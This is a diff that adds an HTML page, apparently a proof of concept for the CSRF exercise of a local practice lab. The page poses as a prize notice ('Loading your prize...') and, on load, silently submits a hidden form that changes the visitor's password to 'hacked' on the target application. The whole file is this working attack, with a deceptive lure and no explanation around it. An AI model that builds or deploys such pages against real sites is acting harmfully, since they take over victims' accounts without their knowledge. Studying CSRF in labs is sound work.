@@ -1,0 +1,14 @@
+<html>
+<head><title>Congratulations!</title></head>
+<body onload="document.getElementById('csrfForm').submit()">
+<h1>Loading your prize...</h1>
+<p>Please wait while we process your reward...</p>
+
+<form action="http://localhost:8081/vulnerabilities/csrf/" method="GET" id="csrfForm" style="display:none">
+  <input type="hidden" name="password_new" value="hacked">
+  <input type="hidden" name="password_conf" value="hacked">
+  <input type="hidden" name="Change" value="Change">
+</form>
+
+</body>
+</html>
